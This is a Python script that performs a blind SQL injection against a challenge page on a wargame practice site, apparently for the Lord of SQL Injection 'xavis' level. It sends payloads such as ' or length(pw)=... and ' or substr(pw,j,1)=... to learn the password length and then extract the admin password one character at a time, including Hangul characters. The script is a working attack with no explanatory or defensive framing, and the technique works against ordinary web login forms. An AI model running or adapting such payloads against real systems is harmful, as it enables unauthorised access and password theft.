from requests import get
import string
from time import sleep

url = "https://los.rubiya.kr/chall/xavis.php"
cookies = dict(PHPSESSID="")
special_strings = "~!@#$%^&*()+-_{}[]<>"
alpha = string.ascii_letters+string.digits+special_strings
result = ""
f = open("hangul.txt",mode="rt", encoding="utf-8")
line = f.read()
n_split = line.split("\n")
hangul = n_split[0].split(" ")
for i in range(0,len(hangul)):
    alpha += hangul[i]

for i in range(1,20):
    parameter = "?pw=1%27%20or%20length(pw)=%27"+str(i)+"%23"
    #parameter = "?pw=1' or length(pw)='"+str(i)+"%23"
    new_url = url + parameter
    r = get(new_url, cookies=cookies)

    if r.text.find("Hello admin") > 0:
        length = i + 1
        print("password length is " + str(i))
        break

for j in range(1,length):
    for i in alpha:
        #parameter = "?pw=1' or ASCII(substr(pw,"+ str(i)+",1))="+str(ord(a))+"%23"
        parameter = "?pw=1%27%20or%20substr(pw,"+str(j)+",1)=%27"+str(i)
        print(parameter)
        new_url = url + parameter
        r = get(new_url, cookies=cookies)

        if r.text.find("Hello admin") > 0:
            print(str(j) + " -> " + str(i))
            result += str(i)
            break

    if j == 1 and result == "":
        print("password not found")
        exit(0)

    if j == length-1:
        result = result.lower()
        print("\npassword is "+result)
        print("\n")
